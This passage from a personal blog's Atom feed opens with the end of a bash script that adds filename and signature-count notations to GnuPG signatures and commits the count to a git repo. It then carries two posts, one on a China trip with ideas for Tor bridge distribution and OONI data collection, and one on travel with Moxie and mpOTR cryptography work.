 #    sig-keyserver-url https://where.your.repo.is/
 #
 # into your gpg.conf. This script embeds the filename which you are signing,
 # as well as the current count of signatures made by your key as notation data
 # in each signature you make using this script. For example, looking at the
 # following packet dump of the signature for 'email.txt', these would be the
 # first two subpackets which start with 'Hashed Sub: notation data':
 #
 # ∃!isisⒶwintermute:(master *$)~ ∴ pgpdump -p email.txt.asc
 # Old: Signature Packet(tag 2)(870 bytes)
 #         Ver 4 - new
 #         Sig type - Signature of a canonical text document(0x01).
 #         Pub alg - RSA Encrypt or Sign(pub 1)
 #         Hash alg - SHA512(hash 10)
 #         Hashed Sub: signature creation time(sub 2)(4 bytes)
 #                 Time - Sat Sep  7 18:04:11 UTC 2013
 #         Hashed Sub: signature expiration time(sub 3)(critical)(4 bytes)
 #                 Time - Sun Sep  7 18:04:11 UTC 2014
 #         Hashed Sub: notation data(sub 20)(41 bytes)
 #                 Flag - Human-readable
 #                 Name - sig.count@patternsinthevoid.net
 #                 Value - 19
 #         Hashed Sub: notation data(sub 20)(61 bytes)
 #                 Flag - Human-readable
 #                 Name - signed.data@patternsinthevoid.net
 #                 Value - /home/isis/email.txt
 #         Hashed Sub: notation data(sub 20)(74 bytes)
 #                 Flag - Human-readable
 #                 Name - isis@patternsinthevoid.net
 #                 Value - 0A6A58A14B5946ABDE18E207A3ADB67A2CDB8B35
 #         Hashed Sub: policy URL(sub 26)(45 bytes)
 #                 URL - https://blog.patternsinthevoid.net/policy.txt
 #         Hashed Sub: preferred key server(sub 24)(93 bytes)
 #                 URL - https://code.patternsinthevoid.net/?p=sigs-0xA3ADB67A2CDB8B35.git;a=blob_plain;f=sigs;hb=HEAD
 #         Sub: issuer key ID(sub 16)(8 bytes)
 #                 Key ID - 0xA3ADB67A2CDB8B35
 #         Hash left 2 bytes - d2 27
 #         RSA m^d mod n(4094 bits) - ...
 #                 -&gt; PKCS-1
 #
 # which show that this signature was the 19th one I made with this script, and
 # the file I signed was 'email.txt'.
 #
 # So, what this script does:
 # --------------------------
 #   1. It embeds the above extra notation data into the signature packets.
 #
 #   2. Then it commits the file containing the signature count, with a commit
 #      message containing a timestamp and the signature count.
 #
 #   3. Next, *it signs the commit*, meaning that for every signature count
 #      *two* signatures are actually being made, but I only cared to keep
 #      trach of the first ones, so deal with it.
 #
 #   4. Then it tries to push to whatever remote you've configured.
 #
 # :authors: Isis Agora Lovecruft, 0xa3adb67a2cdb8b35
 # :license: AGPLv3, see https://www.gnu.org/licenses/agpl-3.0.txt for text
 # :version: 0.0.1
 #-----------------------------------------------------------------------------

 ## SIG_REPO should be set to the local directory your signature count repo is
 ## located at:
 SIG_REPO=~/.gnupg/sigs-0xA3ADB67A2CDB8B35

 ## REMOTE should be set to the name of the remote you wish to push to, if any:
 REMOTE=origin

 ## BRANCH should be set the the name of the branch to push, if any:
 BRANCH=master

 ## Don't touch anything else, unless you've found a bug and are patching it.
 ## ----------------------------------------------------------------------------

 NAME=${0%%/}

 function usage () {
   printf "Usage: %s -f FILE -d DOMAIN [other gpg options]\n\n" $NAME
   printf "Options:\n"
   printf " -f FILE\tThe file to create a signature for\n"
   printf " -d DOMAIN\tThe domain of the email address on your GPG key\n"
   printf " -h\t\tThis cruft\n"
   exit 1
 }

 ## check that we have at least some arguments
 if test "$#" -lt 1 ; then usage ; fi

 while getopts f:d:h x; do
   case $x in
     f)
       file=$OPTARG;
       if test -n "${file}" -a -n "${domain}" ; then
         break
       fi ;;
     d)
       domain=$OPTARG;
       if test -n "${file}" -a -n "${domain}" ; then
         break
       fi ;;
     h) usage;;
     *) break;;
   esac
 done
 shift $((OPTIND - 1))
 gpgopts=$*

 if test -z "$gpgopts" ; then
   gpgopts='-a --clearsign'
 fi

 scf="${SIG_REPO}"/sig-count
 printf "Using signature count file %s" $scf

 gpg -s $gpgopts \
   --sig-notation signed.data@"$domain"="$file" \
   --sig-notation sig.count@"$domain"=$(( `cat $scf` + 1 )) $file &amp;&amp; \
     { ns=$(( `cat $scf` + 1 )) ;
       echo -n "$ns" |&amp; tee &gt; "$scf" ; } &amp;&amp; \
         { d=`date +"%s"`;
           cd $SIG_REPO &amp;&amp; \
           { git add $scf &amp;&amp; \
             git commit -q -S -m "$d $ns" &lt;/dev/null ;} &amp;&amp; \
             { git push $REMOTE $BRANCH &amp;&amp; \
               git log --format=format:"%CredCommit hash:%Cgreen %&gt;(2)%H %n%CredCommit message:%Cgreen %&gt;(2)%s %n%CredSigned commit verification:%n%C(auto)%GG%n" HEAD^.. ;}; }
&lt;/pre&gt;</content><category term="hacking"></category><category term="tor"></category><category term="bridges"></category><category term="gnupg"></category></entry><entry><title>Tor Bridge Distribution &amp; OONI’s Data Collector</title><link href="https://blog.patternsinthevoid.net/tor-bridge-distribution-oonis-data-collector.html" rel="alternate"></link><published>2013-04-28T13:38:00+00:00</published><updated>2015-11-03T16:11:16+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2013-04-28:/tor-bridge-distribution-oonis-data-collector.html</id><summary type="html">

&lt;p&gt;Last week, I went to China, for the first &amp;#8212; and possibly the last &amp;#8212;&amp;nbsp;time. &lt;/p&gt;
&lt;p&gt;Later, when I feel like complaining, I&amp;#8217;ll blog about the negative things, like
the evidence that someone had broken into mine and another Tor developer&amp;#8217;s
hotel room. As well as the tale of being followed by multiple plainclothes
people through the streets of Kowloon, again with another Tor developer, down
alleys, in and out of cabs, through electronic stores where I loudly and openly
bought tiny audio/video devices to bug myself and the hotel room with. This is
the first time I&amp;#8217;ve ever worn a wire (I know, &lt;em&gt;they all say that&lt;/em&gt;, right?): it
doesn&amp;#8217;t feel right. I felt the compulsion to warn people who walked up and
started talking to me, before they spoke. And even then I still felt dirty and&amp;nbsp;creepy.&lt;/p&gt;
&lt;p&gt;&lt;img alt="king-of-kowloon" src="https://blog.patternsinthevoid.net/images/2013/04/king-of-kowloon-small.jpg"&gt;&lt;/p&gt;
&lt;p&gt;When I started officially working on things for the
&lt;a href="https://torproject.org"&gt;Tor Project&lt;/a&gt; a couple years ago, I&amp;#8217;d imagined that
the world was like a map in an &lt;span class="caps"&gt;RPG&lt;/span&gt;, and that there were a lot of dark, hazy
spots that needed filling in. I worried that, if my legal name was publicly
attached to Tor, that places like China, Iran, and Syria would always remain
dark spots. The idea that I might be prevented from seeing and experiencing
those cultures and regions firsthand, that I would not be able to see the
homelands of people I wanted to empower, merely because a (&lt;em&gt;corrupt&lt;/em&gt; would be
redundant) government had gotten wise to some name I don&amp;#8217;t answer to &amp;#8212; it
seemed daunting, and a bit&amp;nbsp;heartbreaking.&lt;/p&gt;
&lt;p&gt;&lt;img alt="kowloon-1" src="https://blog.patternsinthevoid.net/images/2013/04/kowloon-1.jpg"&gt;&lt;/p&gt;
&lt;p&gt;I&amp;#8217;ve been thinking a lot more about borders lately. Ashamed as I am to admit it
(it&amp;#8217;s not like I was ever &lt;em&gt;in favour&lt;/em&gt; of having borders), until now I&amp;#8217;ve held a
very privileged perspective on them. Sure, borders suck. Got it. Yep, people
should be allowed to work wherever they want. Freedom of association, right?
And yet it had never occurred to me: that an invisible line drawn in the sand
could keep you away from your home, or that an arbitrary date on a slip of
paper could decide how long you were permitted to see someone you&amp;nbsp;loved.&lt;/p&gt;


&lt;p&gt;After living in Germany and France for precisely the number of days my tourist
visa would allow, (Oops. I&amp;#8217;d been counting, and thought I was still a week
under. I should probably script that.) I took off for Hong Kong, where
&lt;a href="https://openitp.org"&gt;OpenITP&lt;/a&gt; had generously offered me a travel grant to
attend
&lt;a href="http://openitp.org/?q=node/32"&gt;the third Censorship Circumvention Summit&lt;/a&gt;. Jumping
from France to China to somewhere-undetermined-that-is-not-Schengen definitely
presented some interesting security challenges, since I had to take &lt;em&gt;all of the
things&lt;/em&gt; I own with me. (It all fits in a backpack, so it&amp;#8217;s not a space/money
issue, it&amp;#8217;s&amp;nbsp;a &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;%&amp;amp;$#@! I&amp;#8217;m carrying devices which normally have access to thousands of
computers, including some Tor Project infrastructure and repositories, and I
have to keep them safe from a government …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">

&lt;p&gt;Last week, I went to China, for the first &amp;#8212; and possibly the last &amp;#8212;&amp;nbsp;time. &lt;/p&gt;
&lt;p&gt;Later, when I feel like complaining, I&amp;#8217;ll blog about the negative things, like
the evidence that someone had broken into mine and another Tor developer&amp;#8217;s
hotel room. As well as the tale of being followed by multiple plainclothes
people through the streets of Kowloon, again with another Tor developer, down
alleys, in and out of cabs, through electronic stores where I loudly and openly
bought tiny audio/video devices to bug myself and the hotel room with. This is
the first time I&amp;#8217;ve ever worn a wire (I know, &lt;em&gt;they all say that&lt;/em&gt;, right?): it
doesn&amp;#8217;t feel right. I felt the compulsion to warn people who walked up and
started talking to me, before they spoke. And even then I still felt dirty and&amp;nbsp;creepy.&lt;/p&gt;
&lt;p&gt;&lt;img alt="king-of-kowloon" src="https://blog.patternsinthevoid.net/images/2013/04/king-of-kowloon-small.jpg"&gt;&lt;/p&gt;
&lt;p&gt;When I started officially working on things for the
&lt;a href="https://torproject.org"&gt;Tor Project&lt;/a&gt; a couple years ago, I&amp;#8217;d imagined that
the world was like a map in an &lt;span class="caps"&gt;RPG&lt;/span&gt;, and that there were a lot of dark, hazy
spots that needed filling in. I worried that, if my legal name was publicly
attached to Tor, that places like China, Iran, and Syria would always remain
dark spots. The idea that I might be prevented from seeing and experiencing
those cultures and regions firsthand, that I would not be able to see the
homelands of people I wanted to empower, merely because a (&lt;em&gt;corrupt&lt;/em&gt; would be
redundant) government had gotten wise to some name I don&amp;#8217;t answer to &amp;#8212; it
seemed daunting, and a bit&amp;nbsp;heartbreaking.&lt;/p&gt;
&lt;p&gt;&lt;img alt="kowloon-1" src="https://blog.patternsinthevoid.net/images/2013/04/kowloon-1.jpg"&gt;&lt;/p&gt;
&lt;p&gt;I&amp;#8217;ve been thinking a lot more about borders lately. Ashamed as I am to admit it
(it&amp;#8217;s not like I was ever &lt;em&gt;in favour&lt;/em&gt; of having borders), until now I&amp;#8217;ve held a
very privileged perspective on them. Sure, borders suck. Got it. Yep, people
should be allowed to work wherever they want. Freedom of association, right?
And yet it had never occurred to me: that an invisible line drawn in the sand
could keep you away from your home, or that an arbitrary date on a slip of
paper could decide how long you were permitted to see someone you&amp;nbsp;loved.&lt;/p&gt;


&lt;p&gt;After living in Germany and France for precisely the number of days my tourist
visa would allow, (Oops. I&amp;#8217;d been counting, and thought I was still a week
under. I should probably script that.) I took off for Hong Kong, where
&lt;a href="https://openitp.org"&gt;OpenITP&lt;/a&gt; had generously offered me a travel grant to
attend
&lt;a href="http://openitp.org/?q=node/32"&gt;the third Censorship Circumvention Summit&lt;/a&gt;. Jumping
from France to China to somewhere-undetermined-that-is-not-Schengen definitely
presented some interesting security challenges, since I had to take &lt;em&gt;all of the
things&lt;/em&gt; I own with me. (It all fits in a backpack, so it&amp;#8217;s not a space/money
issue, it&amp;#8217;s&amp;nbsp;a &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;%&amp;amp;$#@! I&amp;#8217;m carrying devices which normally have access to thousands of
computers, including some Tor Project infrastructure and repositories, and I
have to keep them safe from a government that is going to hate me more than
the United States, while eating nothing but plain rice &lt;em&gt;and&lt;/em&gt; travelling
24,671 kilometers?!&amp;#8221;
&lt;br&gt;issue.&lt;/br&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since part of this security setup involved not connecting to anything while
inside China, I tried as best as I could to remove network capability from my
laptop, including recompiling my kernel with most of the CONFIG_[*&lt;span class="caps"&gt;NET&lt;/span&gt;|&lt;span class="caps"&gt;IP&lt;/span&gt;*]
settings disabled. Without internet and only &lt;span class="caps"&gt;IRL&lt;/span&gt; people to talk to, I got bored
pretty fast (&lt;em&gt;kidding!&lt;/em&gt; ♡ ) and resorted to pen and paper technology, because I
had some ideas on Tor bridge distribution regarding a system for having clients
connect to a bridge Distributor, and the Distributor authenticating the clients
or requiring a valid Proof-of-Work computation. If the authcheck or PoW doesn&amp;#8217;t
pass, the Distributor should instruct an &lt;span class="caps"&gt;OONI&lt;/span&gt; Data Collector node to connect to
the client, to scan for censorship events (&lt;em&gt;I wonder if we can actually get a
network vantage point from the &lt;span class="caps"&gt;DPI&lt;/span&gt; boxes?&lt;/em&gt; :D ), else if the client check
passes, the Distributor should instruct a Tor Bridge to connect to the&amp;nbsp;client.&lt;/p&gt;
&lt;p&gt;Here are &lt;a href="https://blog.patternsinthevoid.net/images/2013/04/bdb-and-ooni.jpg"&gt;my notes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Obviously, the Distributors are going to get blocked, but if we were to use
something like David Fifield&amp;#8217;s FlashProxy, with it&amp;#8217;s Facilitator as our
Distributor (notice how all these words are oh-so-cleverly suffixed with
&lt;em&gt;Tor&lt;/em&gt;&amp;#8230;), to contact the Distributor through a &amp;#8220;normal&amp;#8221; browser, the client
should still be able to compute the auth/PoW and the Bridge or &lt;span class="caps"&gt;OONI&lt;/span&gt; Collector
connect back to them. The Proof-of-Work should be necessary for protecting the
Facilitator/Distributor from getting blocked, as well as significantly increase
the cost of scanning for&amp;nbsp;bridges.&lt;/p&gt;
&lt;p&gt;&lt;img alt="kowloon-nathan-rd" src="https://blog.patternsinthevoid.net/images/2013/04/kowloon-nathan-rd.jpg"&gt;&lt;/p&gt;</content><category term="hacking"></category><category term="China"></category><category term="OONI"></category><category term="Tor"></category><category term="Censorship"></category></entry><entry><title>Zeppelins, Chinese Junk Rigs, and Surfboards</title><link href="https://blog.patternsinthevoid.net/zeppelins-chinese-junk-rigs-and-surfboards.html" rel="alternate"></link><published>2013-03-25T13:38:00+00:00</published><updated>2015-11-03T16:02:41+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2013-03-25:/zeppelins-chinese-junk-rigs-and-surfboards.html</id><summary type="html">

&lt;p&gt;One of the first times I met up with &lt;a href="https://twitter.com/moxie"&gt;Moxie&lt;/a&gt; while travelling, we met at a dive
bar in San Francisco&amp;#8217;s Mission District, packed with hipsters. I had nineteen years, a
modified state &lt;span class="caps"&gt;ID&lt;/span&gt; card, and just hitchhiked into town. We sat at the bar, and both ordered well gin and&amp;nbsp;tonics. &lt;/p&gt;
&lt;p&gt;&lt;img alt="junk" src="https://blog.patternsinthevoid.net/images/2013/03/sboc/junk.png"&gt;&lt;/p&gt;
&lt;p&gt;I had a proposal, the sort of get-rich-quick scheme it seems that only 18th century pirates and lazy hacker-squatters are capable of contriving: We fly to China. Then, we spend a few grand purchasing a Chinese junk rig, and equip it with a system of pulleys so that we can man the sails from the cockpit, solo if necessary. Next, we fill the cabin with about as much potable water as we can carry and enough dried food to stave off starvation, and set a course across the northern arc of the Pacific &amp;#8212; avoiding the treachery of the South Seas &amp;#8212; for San Francisco. The choice of vessel was key, the battoned sails and flattened hull of a Chinese junk rig make it arguably one of the safest ships to make a transoceanic voyage alone, not to mention the finicial incentives: being rare in the Americas, a well-kept junk rig would go for anywhere from $50,000 to $250,000 &lt;span class="caps"&gt;USD&lt;/span&gt; &amp;#8212; not to mention grant you free slip fees at just about any marina from Anchorage to Punta Arenas. How could anyone turn down such a preposterous plot which included adventure on the high seas, a high mortality risk, riches and&amp;nbsp;notoriety?&lt;/p&gt;
&lt;p&gt;As I recall, Moxie shook and hung his head, and smiling countered my&amp;nbsp;proposition.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Ever heard of Santos Dumont?&amp;#8221; he&amp;nbsp;asked.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Nope.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So. Santos Dumont was a Brazilian hero, originally a Frenchman. This was around the late 1800s. He was the type of dude who would trek across the Amazon alone, leave for the North Pole with a party of eight and return with a party of three &amp;#8212; your standard gentleman-adventurer, a total madman. Sometime around the turn of the century, he returns to Paris to participate in a race to sail zeppelins from a certain point around the Eifel Tower and back. He wins, but being rich already, gives half the money to charity. The other half of the prize he puts in the care of a trust fund with the instructions that it should be awarded to anyone who can beat his time &amp;#8212; thirty minutes or so, from what I&amp;nbsp;remember.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;No one&amp;#8217;s won it&amp;nbsp;yet?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m not entirely sure, but the story appears to end there &amp;#8212; at least, there is no record of anyone claiming the money in the trust &amp;#8212; and it&amp;#8217;s been sitting there, collecting interest, for over a century&amp;nbsp;now.&amp;#8221; &lt;/p&gt;
&lt;p&gt;Moxie swept the dreads out of his face, took a sip of the gin, and continued: &amp;#8220;It should be simple to beat the time given the advantages of modern&amp;nbsp;materials&amp;#8230;&amp;#8221;&lt;/p&gt;


&lt;p&gt;He and I have had a friendly series of bets throughout our friendship. Moxie usually wins&amp;#8230;and I …&lt;/p&gt;</summary><content type="html">

&lt;p&gt;One of the first times I met up with &lt;a href="https://twitter.com/moxie"&gt;Moxie&lt;/a&gt; while travelling, we met at a dive
bar in San Francisco&amp;#8217;s Mission District, packed with hipsters. I had nineteen years, a
modified state &lt;span class="caps"&gt;ID&lt;/span&gt; card, and just hitchhiked into town. We sat at the bar, and both ordered well gin and&amp;nbsp;tonics. &lt;/p&gt;
&lt;p&gt;&lt;img alt="junk" src="https://blog.patternsinthevoid.net/images/2013/03/sboc/junk.png"&gt;&lt;/p&gt;
&lt;p&gt;I had a proposal, the sort of get-rich-quick scheme it seems that only 18th century pirates and lazy hacker-squatters are capable of contriving: We fly to China. Then, we spend a few grand purchasing a Chinese junk rig, and equip it with a system of pulleys so that we can man the sails from the cockpit, solo if necessary. Next, we fill the cabin with about as much potable water as we can carry and enough dried food to stave off starvation, and set a course across the northern arc of the Pacific &amp;#8212; avoiding the treachery of the South Seas &amp;#8212; for San Francisco. The choice of vessel was key, the battoned sails and flattened hull of a Chinese junk rig make it arguably one of the safest ships to make a transoceanic voyage alone, not to mention the finicial incentives: being rare in the Americas, a well-kept junk rig would go for anywhere from $50,000 to $250,000 &lt;span class="caps"&gt;USD&lt;/span&gt; &amp;#8212; not to mention grant you free slip fees at just about any marina from Anchorage to Punta Arenas. How could anyone turn down such a preposterous plot which included adventure on the high seas, a high mortality risk, riches and&amp;nbsp;notoriety?&lt;/p&gt;
&lt;p&gt;As I recall, Moxie shook and hung his head, and smiling countered my&amp;nbsp;proposition.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Ever heard of Santos Dumont?&amp;#8221; he&amp;nbsp;asked.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Nope.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So. Santos Dumont was a Brazilian hero, originally a Frenchman. This was around the late 1800s. He was the type of dude who would trek across the Amazon alone, leave for the North Pole with a party of eight and return with a party of three &amp;#8212; your standard gentleman-adventurer, a total madman. Sometime around the turn of the century, he returns to Paris to participate in a race to sail zeppelins from a certain point around the Eifel Tower and back. He wins, but being rich already, gives half the money to charity. The other half of the prize he puts in the care of a trust fund with the instructions that it should be awarded to anyone who can beat his time &amp;#8212; thirty minutes or so, from what I&amp;nbsp;remember.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;No one&amp;#8217;s won it&amp;nbsp;yet?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m not entirely sure, but the story appears to end there &amp;#8212; at least, there is no record of anyone claiming the money in the trust &amp;#8212; and it&amp;#8217;s been sitting there, collecting interest, for over a century&amp;nbsp;now.&amp;#8221; &lt;/p&gt;
&lt;p&gt;Moxie swept the dreads out of his face, took a sip of the gin, and continued: &amp;#8220;It should be simple to beat the time given the advantages of modern&amp;nbsp;materials&amp;#8230;&amp;#8221;&lt;/p&gt;


&lt;p&gt;He and I have had a friendly series of bets throughout our friendship. Moxie usually wins&amp;#8230;and I usually forget to name my stakes. I should have bet on this: If ever anyone were to be the cause for my going to the North Pole, it would be&amp;nbsp;Moxie. &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I awoke this morning in my underwear on top of a snarled mess of sheets, with my head rather uncomfortably hanging off the edge of the bed, two laptops and three android android phones¹ piled on top of and around me. The rhythmic pink-noise crash of surf was drafting in on sticky air through an open window above my face. I opened my eyes. Knots of lime-coloured vines hung from a tamarind tree with dark beanpods of fruit half a meter&amp;nbsp;long. &lt;/p&gt;
&lt;p&gt;&lt;img alt="tamarind" src="https://blog.patternsinthevoid.net/images/2013/03/sboc/tamarind.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Qu&amp;#8217;est-que fuck? How did I get to Yavin &lt;span class="caps"&gt;IV&lt;/span&gt;?&lt;/em&gt;  &lt;/p&gt;
&lt;p&gt;I blinked, expecting the familiar snowy silence of Prenzlauerburg to replace the acerbic green foliage, the clockwork clacking of the yellow U-Bahn cars across the raised tracks to replace the steady sound of&amp;nbsp;waves&amp;#8230;&lt;/p&gt;
&lt;p&gt;&lt;img alt="prenzlauerberg" src="https://blog.patternsinthevoid.net/images/2013/03/sboc/eberswalderstrasse-prenzlauerberg-hinterof.jpg"&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Nope. Still on Yavin &lt;span class="caps"&gt;IV&lt;/span&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Then I remembered the dark curls hanging over noetic eyes and »à plus« on a trainstation platform in the French Alps, the two-hour search and interrogation by &lt;span class="caps"&gt;US&lt;/span&gt; customs agents in the basement of the Montrèal airport, talking all night with expat Iranian dissident-hackers and deciphering the pyobfsproxy stacktraces and kanji showing up in my terminal at the Tor developer meeting at Harvard, and then the series of flights which brought me to the longitudinal apogee of my starting point five days ago. The shortest path of return is straight down; the fastest takes me &lt;a href="http://www.distance.to/Honolulu_Berlin"&gt;directly over the North Pole&lt;/a&gt;. Damnit, should&amp;#8217;ve made that&amp;nbsp;bet&amp;#8230;&lt;/p&gt;
&lt;p&gt;One of the bets I lost years ago &amp;#8212; I think this one was the cost of my hubristic belief that I could pick a lock faster than Moxie &amp;#8212; had the stakes &amp;#8220;loser has to go surfing naked&amp;#8221;. I still haven&amp;#8217;t paid that debt, but, having been on a surf team as a kid, I bet that, wetsuit or otherwise, I could surf better than he could. I think I forgot to name my stakes again, but it doesn&amp;#8217;t matter because I had to let Moxie off the hook this time, due to the painful complications of his recent knee surgery. Though, while waiting for the others to arrive, Christine, Moxie, and I did get a chance to to test out the small surf in our front&amp;nbsp;yard.&lt;/p&gt;
&lt;p&gt;I haven&amp;#8217;t had to write any Java yet, and, tragically, my watercolour portait of &lt;a href="http://www.novosti.rs/upload/images/2011/03/3003j/james-gosling-java.jpg"&gt;James Arthur Gosling&lt;/a&gt; was confiscated at &lt;span class="caps"&gt;U.S.&lt;/span&gt; Customs in Montrèal, but I did write about twelve pages of equations in an attempt to sort out an elliptic curve &lt;span class="caps"&gt;MQV&lt;/span&gt; variation, changed to add embedded, deniable, and authenticated, key exchanges for both a long-term identity key and ephemeral session key as per Ian Goldberg et.al.&amp;#8217;s denAKE() algorithm in the &lt;a href="http://www.cypherpunks.ca/~iang/pubs/mpotr.pdf"&gt;Multi-Party Off-The-Record paper&lt;/a&gt;. That&amp;#8217;ll get added to &lt;a href="https://github.com/isislovecruft/mpOTR"&gt;my fork of a collaborative &lt;span class="caps"&gt;MPOTR&lt;/span&gt; spec&lt;/a&gt; git repo shortly, and review by cryptologists is greatly appreciated. I also rooted my newly-acquired (for &lt;a href="https://ooni.torproject.org/"&gt;&lt;span class="caps"&gt;OONI&lt;/span&gt;&lt;/a&gt; mobile development testing and reading &lt;a href="http://arxiv.org/"&gt;arxiv&lt;/a&gt; papers) android jellybean tablet, and finally ate the taco and tapatio-coated mango I&amp;#8217;d been craving in&amp;nbsp;Berlin.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.patternsinthevoid.net"&gt;isis&lt;/a&gt; &lt;a href="https://github.com/isislovecruft"&gt;agora&lt;/a&gt; &lt;a href="https://twitter.com/isislovecruft"&gt;lovecruft&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lahaina, Maui, Hawaii, United&amp;nbsp;States&lt;/p&gt;
&lt;p&gt;24 March&amp;nbsp;2013&lt;/p&gt;
&lt;p&gt;¹ Well, actually, one of them was a mozilla boot-to-gecko developer&amp;nbsp;phone.&lt;/p&gt;</content><category term="travel"></category><category term="Spring Break of Code"></category><category term="Whispersys"></category></entry></feed>